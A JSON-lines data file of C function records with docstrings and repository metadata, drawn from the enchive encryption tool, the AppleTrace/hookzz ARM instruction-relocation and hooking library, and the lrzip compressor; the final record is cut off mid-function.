{"docstring": "/**\n * Fill ADDR with a unix domain socket name for the agent.\n */\n", "func_signal": "static int\nagent_addr(struct sockaddr_un *addr, const uint8_t *iv)", "code": "{\n    char *dir = getenv(\"XDG_RUNTIME_DIR\");\n    if (!dir) {\n        dir = getenv(\"TMPDIR\");\n        if (!dir)\n            dir = \"/tmp\";\n    }\n\n    addr->sun_family = AF_UNIX;\n    if (strlen(dir) + 1 + 16 + 1 > sizeof(addr->sun_path)) {\n        warning(\"agent socket path too long -- %s\", dir);\n        return 0;\n    } else {\n        sprintf(addr->sun_path, \"%s/%02x%02x%02x%02x%02x%02x%02x%02x\", dir,\n                iv[0], iv[1], iv[2], iv[3], iv[4], iv[5], iv[6], iv[7]);\n        return 1;\n    }\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Read a passphrase without any fanfare (fallback).\n */\n", "func_signal": "static void\nget_passphrase_dumb(char *buf, size_t len, char *prompt)", "code": "{\n    size_t passlen;\n    warning(\"reading passphrase from stdin with echo\");\n    fputs(prompt, stderr);\n    fflush(stderr);\n    if (!fgets(buf, len, stdin))\n        fatal(\"could not read passphrase\");\n    passlen = strlen(buf);\n    if (buf[passlen - 1] < ' ')\n        buf[passlen - 1] = 0;\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Return a copy of S, which may be NULL.\n * Abort the program if out of memory.\n */\n", "func_signal": "static char *\ndupstr(const char *s)", "code": "{\n    char *copy = 0;\n    if (s) {\n        size_t len = strlen(s) + 1;\n        copy = malloc(len);\n        if (!copy)\n            fatal(\"out of memory\");\n        memcpy(copy, s, len);\n    }\n    return copy;\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/* Use %APPDATA% */\n", "func_signal": "static char *\nstorage_directory(char *file)", "code": "{\n    char *parent;\n    static const char enchive[] = \"\\\\enchive\\\\\";\n    char *appdata = getenv(\"APPDATA\");\n    if (!appdata)\n        fatal(\"$APPDATA is unset\");\n\n    parent = joinstr(2, appdata, enchive);\n    if (!CreateDirectory(parent, 0)) {\n        if (GetLastError() == ERROR_PATH_NOT_FOUND) {\n            fatal(\"$APPDATA directory doesn't exist\");\n        } else { /* ERROR_ALREADY_EXISTS */\n            DWORD attr = GetFileAttributes(parent);\n            if ((attr == INVALID_FILE_ATTRIBUTES) ||\n                !(attr & FILE_ATTRIBUTE_DIRECTORY))\n                fatal(\"%s is not a directory\", parent);\n        }\n    }\n    free(parent);\n\n    return joinstr(3, appdata, enchive, file);\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "// PAGE: C6-535\n", "func_signal": "static zbool zz_arm64_relocator_rewrite_ADR(ZzArm64Relocator *self, const ZzInstruction *insn_ctx,\n                                            ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    zuint32 immhi = get_insn_sub(insn, 5, 19);\n    zuint32 immlo = get_insn_sub(insn, 29, 2);\n    zuint64 imm = immhi << 2 | immlo;\n\n    zaddr target_address;\n    target_address = insn_ctx->pc + imm;\n    int Rt_ndx = get_insn_sub(insn, 0, 4);\n\n    zz_arm64_writer_put_ldr_b_reg_address(self->output, Rt_ndx, target_address);\n\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm64/relocator-arm64.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: C6-549\n", "func_signal": "static zbool zz_arm64_relocator_rewrite_B_cond(ZzArm64Relocator *self, const ZzInstruction *insn_ctx,\n                                               ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    zuint32 imm19 = get_insn_sub(insn, 5, 19);\n\n    zuint64 offset = imm19 << 2;\n\n    zaddr target_address;\n    target_address = insn_ctx->pc + offset;\n\n    zuint32 cond = get_insn_sub(insn, 0, 4);\n\n    zz_arm64_writer_put_b_cond_imm(self->output, cond, 0x8);\n    zz_arm64_writer_put_b_imm(self->output, 0x14);\n    zz_arm64_writer_put_ldr_br_reg_address(self->output, ZZ_ARM64_REG_X17, target_address);\n\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm64/relocator-arm64.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: C6-536\n", "func_signal": "static zbool zz_arm64_relocator_rewrite_ADRP(ZzArm64Relocator *self, const ZzInstruction *insn_ctx,\n                                             ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    zuint32 immhi = get_insn_sub(insn, 5, 19);\n    zuint32 immlo = get_insn_sub(insn, 29, 2);\n    // 12 is PAGE-SIZE\n    zuint64 imm = immhi << 2 << 12 | immlo << 12;\n\n    zaddr target_address;\n    target_address = (insn_ctx->pc & 0xFFFFFFFFFFFFF000) + imm;\n    int Rt_ndx = get_insn_sub(insn, 0, 4);\n\n    zz_arm64_writer_put_ldr_b_reg_address(self->output, Rt_ndx, target_address);\n\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm64/relocator-arm64.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: A8-334\n", "func_signal": "static zbool zz_arm_relocator_rewrite_B_A1(ZzArmRelocator *self, const ZzInstruction *insn_ctx,\n                                           ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    zuint32 imm24 = get_insn_sub(insn, 0, 24);\n    zuint32 imm32 = imm24 << 2;\n    zaddr target_address;\n    target_address = insn_ctx->pc + imm32;\n\n    zz_arm_writer_put_instruction(self->output, (insn & 0xFF000000) | 0);\n    zz_arm_writer_put_b_imm(self->output, 0x4);\n    zz_arm_writer_put_ldr_reg_address(self->output, ZZ_ARM_REG_PC, target_address);\n\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm/relocator-arm.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: C6-560\n", "func_signal": "static zbool zz_arm64_relocator_rewrite_BL(ZzArm64Relocator *self, const ZzInstruction *insn_ctx,\n                                           ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    zuint32 imm26 = get_insn_sub(insn, 0, 26);\n\n    zuint64 offset = imm26 << 2;\n\n    zaddr target_address;\n    target_address = insn_ctx->pc + offset;\n\n    zz_arm64_writer_put_ldr_blr_b_reg_address(self->output, ZZ_ARM64_REG_X17, target_address);\n    ZzLiteralInstruction **literal_insn_ptr = &(self->relocate_literal_insns[self->relocate_literal_insns_size++]);\n    zz_arm64_writer_put_ldr_br_reg_relocate_address(self->output, ZZ_ARM64_REG_X17, insn_ctx->pc + 4, literal_insn_ptr);\n\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm64/relocator-arm64.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// ------- user custom -------\n", "func_signal": "void zz_arm_writer_put_ldr_b_reg_address(ZzArmWriter *self, ZzARMReg reg, zaddr address)", "code": "{\n    self->literal_insns[self->literal_insn_size].literal_insn_ptr = self->codedata;\n    zz_arm_writer_put_ldr_reg_reg_imm(self, reg, ZZ_ARM_REG_PC, 0);\n    zz_arm_writer_put_b_imm(self, 0x0);\n    self->literal_insns[self->literal_insn_size++].literal_address_ptr = self->codedata;\n    zz_arm_writer_put_bytes(self, (zpointer)&address, sizeof(zpointer));\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm/writer-arm.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: A8-348\n", "func_signal": "static zbool zz_arm_relocator_rewrite_BLBLX_immediate_A1(ZzArmRelocator *self, const ZzInstruction *insn_ctx,\n                                                         ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    zuint32 imm24 = get_insn_sub(insn, 0, 24);\n    zuint32 imm32 = imm24 << 2;\n    zaddr target_address;\n    target_address = ALIGN_4(insn_ctx->pc) + imm32;\n\n    // CurrentInstrSet = thumb\n    // targetInstrSet = arm\n\n    // convert 'bl' to 'b', but save 'cond'\n    zz_arm_writer_put_instruction(self->output, (insn & 0xF0000000) | 0b1010 << 24 | 0);\n\n    ZzArmWriter ouput_bak = *self->output;\n\n    zz_arm_writer_put_b_imm(self->output, 0);\n    ZzLiteralInstruction **literal_insn_ptr = &(self->relocate_literal_insns[self->relocate_literal_insns_size++]);\n    zz_arm_writer_put_ldr_b_reg_relocate_address(self->output, ZZ_ARM_REG_LR, insn_ctx->pc - 4, literal_insn_ptr);\n    zz_arm_writer_put_ldr_reg_address(self->output, ZZ_ARM_REG_PC, target_address);\n\n    // overwrite `zz_arm_writer_put_b_imm`\n    zz_arm_writer_put_b_imm(&ouput_bak, self->output->pc - ouput_bak.pc - 8);\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm/relocator-arm.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// just like post_call, wow!\n", "func_signal": "void function_context_end_invocation(ZzHookFunctionEntry *entry, zpointer next_hop, RegState *rs)", "code": "{\n    Xdebug(\"%p call end-invocation\", entry->target_ptr);\n\n    ZzThreadStack *stack = ZzGetCurrentThreadStack(entry->thread_local_key);\n    if (!stack) {\n#if defined(DEBUG_MODE)\n        debug_break();\n#endif\n    }\n    ZzCallStack *callstack = ZzPopCallStack(stack);\n\n    /* call post_call */\n    if (entry->post_call) {\n        POSTCALL post_call;\n        post_call = entry->post_call;\n        (*post_call)(rs, (ThreadStack *)stack, (CallStack *)callstack);\n    }\n\n    /* set next hop */\n    *(zpointer *)next_hop = callstack->caller_ret_addr;\n    ZzFreeCallStack(callstack);\n}", "path": "AppleTrace/hookzz/src/platforms/backend-arm64/thunker-arm64.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: A8-348\n", "func_signal": "static zbool zz_arm_relocator_rewrite_BLBLX_immediate_A2(ZzArmRelocator *self, const ZzInstruction *insn_ctx,\n                                                         ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    zuint32 H = get_insn_sub(insn, 24, 1);\n    zuint32 imm24 = get_insn_sub(insn, 0, 24);\n    zuint32 imm32 = (imm24 << 2) | (H << 1);\n    zaddr target_address;\n    target_address = insn_ctx->pc + imm32;\n\n    ZzLiteralInstruction **literal_insn_ptr = &(self->relocate_literal_insns[self->relocate_literal_insns_size++]);\n    zz_arm_writer_put_ldr_b_reg_relocate_address(self->output, ZZ_ARM_REG_LR, insn_ctx->pc - 4, literal_insn_ptr);\n    zz_arm_writer_put_ldr_reg_address(self->output, ZZ_ARM_REG_PC, target_address);\n\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm/relocator-arm.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: A8-312\n", "func_signal": "static zbool zz_arm_relocator_rewrite_ADD_register_A1(ZzArmRelocator *self, const ZzInstruction *insn_ctx,\n                                                      ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n\n    zuint32 Rn_ndx, Rd_ndx, Rm_ndx;\n    Rn_ndx = get_insn_sub(insn, 16, 4);\n    Rd_ndx = get_insn_sub(insn, 12, 4);\n    Rm_ndx = get_insn_sub(insn, 0, 4);\n\n    if (Rn_ndx != ZZ_ARM_REG_PC) {\n        return FALSE;\n    }\n    // push R7\n    zz_arm_writer_put_push_reg(self->output, ZZ_ARM_REG_R7);\n    zz_arm_writer_put_ldr_b_reg_address(self->output, ZZ_ARM_REG_R7, insn_ctx->pc);\n    zz_arm_writer_put_instruction(self->output, (insn & 0xFFF0FFFF) | ZZ_ARM_REG_R7 << 16);\n    // pop R7\n    zz_arm_writer_put_pop_reg(self->output, ZZ_ARM_REG_R7);\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm/relocator-arm.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// just like post_call, wow!\n", "func_signal": "void function_context_half_invocation(ZzHookFunctionEntry *entry, zpointer next_hop, RegState *rs,\n                                      zpointer caller_ret_addr)", "code": "{\n    Xdebug(\"target %p call half-invocation\", entry->target_ptr);\n\n    ZzThreadStack *stack = ZzGetCurrentThreadStack(entry->thread_local_key);\n    if (!stack) {\n#if defined(DEBUG_MODE)\n        debug_break();\n#endif\n    }\n    ZzCallStack *callstack = ZzPopCallStack(stack);\n\n    /* call half_call */\n    if (entry->half_call) {\n        HALFCALL half_call;\n        half_call = entry->half_call;\n        (*half_call)(rs, (ThreadStack *)stack, (CallStack *)callstack);\n    }\n\n    /*  set next hop */\n    *(zpointer *)next_hop = (zpointer)entry->target_half_ret_addr;\n\n    ZzFreeCallStack(callstack);\n}", "path": "AppleTrace/hookzz/src/platforms/backend-x86/thunker-x86.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: A8-322\n", "func_signal": "static zbool zz_arm_relocator_rewrite_ADR_A1(ZzArmRelocator *self, const ZzInstruction *insn_ctx,\n                                             ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    zuint32 imm12 = get_insn_sub(insn, 0, 12);\n    zuint32 imm32 = imm12;\n    zaddr target_address;\n    target_address = insn_ctx->pc + imm32;\n    int Rt_ndx = get_insn_sub(insn, 12, 4);\n\n    zz_arm_writer_put_ldr_b_reg_address(self->output, Rt_ndx, target_address);\n\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm/relocator-arm.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: C6-550\n", "func_signal": "static zbool zz_arm64_relocator_rewrite_B(ZzArm64Relocator *self, const ZzInstruction *insn_ctx,\n                                          ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    zuint32 imm26 = get_insn_sub(insn, 0, 26);\n\n    zuint64 offset = imm26 << 2;\n\n    zaddr target_address;\n    target_address = insn_ctx->pc + offset;\n\n    zz_arm64_writer_put_ldr_br_reg_address(self->output, ZZ_ARM64_REG_X17, target_address);\n\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm64/relocator-arm64.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: C6-673\n", "func_signal": "static zbool zz_arm64_relocator_rewrite_LDR_literal(ZzArm64Relocator *self, const ZzInstruction *insn_ctx,\n                                                    ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    // TODO: check opc == 10, with signed\n    zuint32 imm19 = get_insn_sub(insn, 5, 19);\n    zuint64 offset = imm19 << 2;\n\n    zaddr target_address;\n    target_address = insn_ctx->pc + offset;\n    int Rt_ndx = get_insn_sub(insn, 0, 4);\n\n    zz_arm64_writer_put_ldr_b_reg_address(self->output, Rt_ndx, target_address);\n    zz_arm64_writer_put_ldr_reg_reg_offset(self->output, Rt_ndx, Rt_ndx, 0);\n\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm64/relocator-arm64.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// ATTENTION !!!:\n// \u5199 writer \u90e8\u5206, \u9700\u8981\u53c2\u8003, `Instrcution Set Encoding` \u90e8\u5206\n// `writer` REF: `ZzInstruction Set Encoding`\n", "func_signal": "ZzArmWriter *zz_arm_writer_new(zpointer data_ptr)", "code": "{\n    ZzArmWriter *writer = (ZzArmWriter *)malloc(sizeof(ZzArmWriter));\n    memset(writer, 0, sizeof(ZzArmWriter));\n\n    zaddr align_address = (zaddr)data_ptr & ~(zaddr)3;\n    writer->codedata = (zpointer)align_address;\n    writer->base = (zpointer)align_address;\n    writer->pc = align_address;\n    writer->size = 0;\n\n    writer->literal_insn_size = 0;\n    memset(writer->literal_insns, 0, sizeof(ZzLiteralInstruction) * MAX_LITERAL_INSN_SIZE);\n\n    return writer;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm/writer-arm.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// just like pre_call, wow!\n", "func_signal": "void function_context_begin_invocation(ZzHookFunctionEntry *entry, zpointer next_hop, RegState *rs,\n                                       zpointer caller_ret_addr)", "code": "{\n    Xinfo(\"target %p call begin-invocation\", entry->target_ptr);\n\n    ZzThreadStack *stack = ZzGetCurrentThreadStack(entry->thread_local_key);\n    if (!stack) {\n        stack = ZzNewThreadStack(entry->thread_local_key);\n    }\n    ZzCallStack *callstack = ZzNewCallStack();\n    ZzPushCallStack(stack, callstack);\n\n    /* call pre_call */\n    if (entry->pre_call) {\n        PRECALL pre_call;\n        pre_call = entry->pre_call;\n        (*pre_call)(rs, (ThreadStack *)stack, (CallStack *)callstack);\n    }\n\n    /* set next hop */\n    if (entry->replace_call) {\n        *(zpointer *)next_hop = entry->replace_call;\n    } else {\n        *(zpointer *)next_hop = entry->on_invoke_trampoline;\n    }\n\n    if (entry->hook_type == HOOK_FUNCTION_TYPE) {\n        callstack->caller_ret_addr = *(zpointer *)caller_ret_addr;\n        *(zpointer *)caller_ret_addr = entry->on_leave_trampoline;\n    }\n}", "path": "AppleTrace/hookzz/src/platforms/backend-x86/thunker-x86.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// PAGE: A8-410\n", "func_signal": "static zbool zz_arm_relocator_rewrite_LDR_literal_A1(ZzArmRelocator *self, const ZzInstruction *insn_ctx,\n                                                     ZzRelocateInstruction *re_insn_ctx)", "code": "{\n    zuint32 insn = insn_ctx->insn;\n    zuint32 imm12 = get_insn_sub(insn, 0, 12);\n    zuint32 imm32 = imm12;\n    zbool add = get_insn_sub(insn, 7 + 16, 1) == 1;\n    zaddr target_address;\n    if (add)\n        target_address = insn_ctx->pc + imm32;\n    else\n        target_address = insn_ctx->pc - imm32;\n    int Rt_ndx = get_insn_sub(insn, 12, 4);\n\n    zz_arm_writer_put_ldr_b_reg_address(self->output, Rt_ndx, target_address);\n    zz_arm_writer_put_ldr_reg_reg_imm(self->output, Rt_ndx, Rt_ndx, 0);\n\n    return TRUE;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm/relocator-arm.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// just like post_call, wow!\n", "func_signal": "void function_context_end_invocation(ZzHookFunctionEntry *entry, zpointer next_hop, RegState *rs)", "code": "{\n    Xdebug(\"%p call end-invocation\", entry->target_ptr);\n\n    ZzThreadStack *stack = ZzGetCurrentThreadStack(entry->thread_local_key);\n    if (!stack) {\n#if defined(DEBUG_MODE)\n        debug_break();\n#endif\n    }\n    ZzCallStack *callstack = ZzPopCallStack(stack);\n\n    /* call post_call */\n    if (entry->post_call) {\n        POSTCALL post_call;\n        post_call = entry->post_call;\n        (*post_call)(rs, (ThreadStack *)stack, (CallStack *)callstack);\n    }\n\n    /* set next hop */\n    *(zpointer *)next_hop = callstack->caller_ret_addr;\n    ZzFreeCallStack(callstack);\n}", "path": "AppleTrace/hookzz/src/platforms/backend-x86/thunker-x86.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// ------- architecture default -------\n", "func_signal": "void zz_arm_writer_put_bytes(ZzArmWriter *self, zbyte *data, zuint data_size)", "code": "{\n    memcpy(self->codedata, data, data_size);\n    self->codedata = (zpointer)self->codedata + data_size;\n    self->pc += data_size;\n    self->size += data_size;\n}", "path": "AppleTrace/hookzz/src/platforms/arch-arm/writer-arm.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "// just like post_call, wow!\n", "func_signal": "void function_context_half_invocation(ZzHookFunctionEntry *entry, zpointer next_hop, RegState *rs,\n                                      zpointer caller_ret_addr)", "code": "{\n    Xdebug(\"target %p call half-invocation\", entry->target_ptr);\n\n    ZzThreadStack *stack = ZzGetCurrentThreadStack(entry->thread_local_key);\n    if (!stack) {\n#if defined(DEBUG_MODE)\n        debug_break();\n#endif\n    }\n    ZzCallStack *callstack = ZzPopCallStack(stack);\n\n    /* call half_call */\n    if (entry->half_call) {\n        HALFCALL half_call;\n        half_call = entry->half_call;\n        (*half_call)(rs, (ThreadStack *)stack, (CallStack *)callstack);\n    }\n\n    /*  set next hop */\n    *(zpointer *)next_hop = (zpointer)entry->target_half_ret_addr;\n\n    ZzFreeCallStack(callstack);\n}", "path": "AppleTrace/hookzz/src/platforms/backend-arm64/thunker-arm64.c", "commit_date": "2018-12-19 00:00:00", "repo_name": "everettjf/AppleTrace", "stars": 792, "license": "mit", "language": "c", "size": 1278}
{"docstring": "/* prepare a set of n streams for reading on file descriptor f */\n", "func_signal": "void *open_stream_in(rzip_control *control, int f, int n, char chunk_bytes)", "code": "{\n\tstruct stream_info *sinfo;\n\tint total_threads, i;\n\ti64 header_length;\n\n\tsinfo = calloc(sizeof(struct stream_info), 1);\n\tif (unlikely(!sinfo))\n\t\treturn NULL;\n\n\t/* We have one thread dedicated to stream 0, and one more thread than\n\t * CPUs to keep them busy, unless we're running single-threaded. */\n\tif (control->threads > 1)\n\t\ttotal_threads = control->threads + 2;\n\telse\n\t\ttotal_threads = control->threads + 1;\n\tthreads = calloc(sizeof(pthread_t), total_threads);\n\tif (unlikely(!threads))\n\t\treturn NULL;\n\n\tucthread = calloc(sizeof(struct uncomp_thread), total_threads);\n\tif (unlikely(!ucthread)) {\n\t\tdealloc(sinfo);\n\t\tdealloc(threads);\n\t\tfatal_return((\"Unable to calloc cthread in open_stream_in\\n\"), NULL);\n\t}\n\n\tsinfo->num_streams = n;\n\tsinfo->fd = f;\n\tsinfo->chunk_bytes = chunk_bytes;\n\n\tsinfo->s = calloc(sizeof(struct stream), n);\n\tif (unlikely(!sinfo->s)) {\n\t\tdealloc(sinfo);\n\t\treturn NULL;\n\t}\n\n\tsinfo->s[0].total_threads = 1;\n\tsinfo->s[1].total_threads = total_threads - 1;\n\n\tif (control->major_version == 0 && control->minor_version > 5) {\n\t\t/* Read in flag that tells us if there are more chunks after\n\t\t * this. Ignored if we know the final file size */\n\t\tprint_maxverbose(\"Reading eof flag at %lld\\n\", get_readseek(control, f));\n\t\tif (unlikely(read_u8(control, f, &control->eof))) {\n\t\t\tprint_err(\"Failed to read eof flag in open_stream_in\\n\");\n\t\t\tgoto failed;\n\t\t}\n\t\tprint_maxverbose(\"EOF: %d\\n\", control->eof);\n\n\t\t/* Read in the expected chunk size */\n\t\tif (!ENCRYPT) {\n\t\t\tprint_maxverbose(\"Reading expected chunksize at %lld\\n\", get_readseek(control, f));\n\t\t\tif (unlikely(read_val(control, f, &sinfo->size, sinfo->chunk_bytes))) {\n\t\t\t\tprint_err(\"Failed to read in chunk size in open_stream_in\\n\");\n\t\t\t\tgoto failed;\n\t\t\t}\n\t\t\tsinfo->size = le64toh(sinfo->size);\n\t\t\tprint_maxverbose(\"Chunk size: %lld\\n\", sinfo->size);\n\t\t\tcontrol->st_size += sinfo->size;\n\t\t\tif (unlikely(sinfo->chunk_bytes < 1 || sinfo->chunk_bytes > 8 || sinfo->size < 0)) {\n\t\t\t\tprint_err(\"Invalid chunk data size %d bytes %lld\\n\", sinfo->size, sinfo->chunk_bytes);\n\t\t\t\tgoto failed;\n\t\t\t}\n\t\t}\n\t}\n\tsinfo->initial_pos = get_readseek(control, f);\n\tif (unlikely(sinfo->initial_pos == -1))\n\t\tgoto failed;\n\n\tfor (i = 0; i < n; i++) {\n\t\tuchar c, enc_head[25 + SALT_LEN];\n\t\ti64 v1, v2;\n\n\t\tsinfo->s[i].base_thread = i;\n\t\tsinfo->s[i].uthread_no = sinfo->s[i].base_thread;\n\t\tsinfo->s[i].unext_thread = sinfo->s[i].base_thread;\n\n\t\tif (unlikely(ENCRYPT && read_buf(control, f, enc_head, SALT_LEN)))\n\t\t\tgoto failed;\nagain:\n\t\tif (unlikely(read_u8(control, f, &c)))\n\t\t\tgoto failed;\n\n\t\t/* Compatibility crap for versions < 0.40 */\n\t\tif (control->major_version == 0 && control->minor_version < 4) {\n\t\t\tu32 v132, v232, last_head32;\n\n\t\t\tif (unlikely(read_u32(control, f, &v132)))\n\t\t\t\tgoto failed;\n\t\t\tif (unlikely(read_u32(control, f, &v232)))\n\t\t\t\tgoto failed;\n\t\t\tif (unlikely(read_u32(control, f, &last_head32)))\n\t\t\t\tgoto failed;\n\n\t\t\tv1 = v132;\n\t\t\tv2 = v232;\n\t\t\tsinfo->s[i].last_head = last_head32;\n\t\t\theader_length = 13;\n\t\t} else {\n\t\t\tint read_len;\n\n\t\t\tprint_maxverbose(\"Reading stream %d header at %lld\\n\", i, get_readseek(control, f));\n\t\t\tif ((control->major_version == 0 && control->minor_version < 6) ||\n\t\t\t\tENCRYPT)\n\t\t\t\t\tread_len = 8;\n\t\t\telse\n\t\t\t\tread_len = sinfo->chunk_bytes;\n\t\t\tif (unlikely(read_val(control, f, &v1, read_len)))\n\t\t\t\tgoto failed;\n\t\t\tif (unlikely(read_val(control, f, &v2, read_len)))\n\t\t\t\tgoto failed;\n\t\t\tif (unlikely(read_val(control, f, &sinfo->s[i].last_head, read_len)))\n\t\t\t\tgoto failed;\n\t\t\theader_length = 1 + (read_len * 3);\n\t\t}\n\t\tsinfo->total_read += header_length;\n\n\t\tif (ENCRYPT) {\n\t\t\tif (unlikely(!decrypt_header(control, enc_head, &c, &v1, &v2, &sinfo->s[i].last_head)))\n\t\t\t\tgoto failed;\n\t\t\tsinfo->total_read += SALT_LEN;\n\t\t}\n\n\t\tv1 = le64toh(v1);\n\t\tv2 = le64toh(v2);\n\t\tsinfo->s[i].last_head = le64toh(sinfo->s[i].last_head);\n\n\t\tif (unlikely(c == CTYPE_NONE && v1 == 0 && v2 == 0 && sinfo->s[i].last_head == 0 && i == 0)) {\n\t\t\tprint_err(\"Enabling stream close workaround\\n\");\n\t\t\tsinfo->initial_pos += header_length;\n\t\t\tgoto again;\n\t\t}\n\n\t\tif (unlikely(c != CTYPE_NONE)) {\n\t\t\tprint_err(\"Unexpected initial tag %d in streams\\n\", c);\n\t\t\tif (ENCRYPT)\n\t\t\t\tprint_err(\"Wrong password?\\n\");\n\t\t\tgoto failed;\n\t\t}\n\t\tif (unlikely(v1)) {\n\t\t\tprint_err(\"Unexpected initial c_len %lld in streams %lld\\n\", v1, v2);\n\t\t\tgoto failed;\n\t\t}\n\t\tif (unlikely(v2)) {\n\t\t\tprint_err(\"Unexpected initial u_len %lld in streams\\n\", v2);\n\t\t\tgoto failed;\n\t\t}\n\t}\n\n\treturn (void *)sinfo;\n\nfailed:\n\tdealloc(sinfo->s);\n\tdealloc(sinfo);\n\treturn NULL;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* As others are slow and lzo very fast, it is worth doing a quick lzo pass\n   to see if there is any compression at all with lzo first. It is unlikely\n   that others will be able to compress if lzo is unable to drop a single byte\n   so do not compress any block that is incompressible by lzo. */\n", "func_signal": "static int lzo_compresses(rzip_control *control, uchar *s_buf, i64 s_len)", "code": "{\n\tlzo_bytep wrkmem = NULL;\n\tlzo_uint in_len, test_len = s_len, save_len = s_len;\n\tlzo_uint dlen;\n\tuchar *c_buf = NULL, *test_buf = s_buf;\n\t/* set minimum buffer test size based on the length of the test stream */\n\tunsigned long buftest_size = (test_len > 5 * STREAM_BUFSIZE ? STREAM_BUFSIZE : STREAM_BUFSIZE / 4096);\n\tint ret = 0;\n\tint workcounter = 0;\t/* count # of passes */\n\tlzo_uint best_dlen = UINT_MAX; /* save best compression estimate */\n\n\tif (!LZO_TEST)\n\t\treturn 1;\n\twrkmem = (lzo_bytep) 